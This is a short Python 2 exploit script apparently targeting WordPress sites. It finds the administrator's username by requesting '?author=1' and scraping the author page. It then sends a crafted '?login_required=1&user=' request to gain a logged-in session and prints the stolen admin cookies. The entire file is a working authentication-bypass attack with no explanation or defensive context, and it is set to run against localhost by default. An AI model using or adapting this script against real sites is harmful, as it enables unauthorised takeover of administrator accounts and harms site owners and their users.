#!/usr/bin/python2

import requests

def fix_host(host):
    if ((not host.startswith("http://")) and (not host.startswith("https://"))):
        host = "http://" + host
    if (host.endswith("/")):
        host = host[:-1]
    return host

def get_username(url):
    page = requests.get('%s?author=1' % url).text
    for line in page.split('\n'):
        if '<span class="vcard">' in line:
            line = line.strip()
            line = line.split('>')[2].strip()
            line = line.split('<')[0].strip()
            return line
    return None

def exploit(url):
    url = fix_host(url)
    print '[+] Finding admin username...'
    username = get_username(url)
    if username:
        print '[+] Found username: %s' % username
    else:
        print '[!] Could not find username.'
        raise SystemExit
    cookie = ''
    print '[+] Exploiting...'
    with requests.Session() as s:
        req = s.get('%s?login_required=1&user=%s' % (url, username))
        if 'logout' in req.text:
            print '[+] Exploit successful.'
            cookie = s.cookies
        else:
            print '[!] Exploit unsuccessful.'
            raise SystemExit
    print '[+] Admin cookies: %s' % cookie

if __name__ == "__main__":
    print '[+] Starting exploit...'
    exploit('localhost/wp')
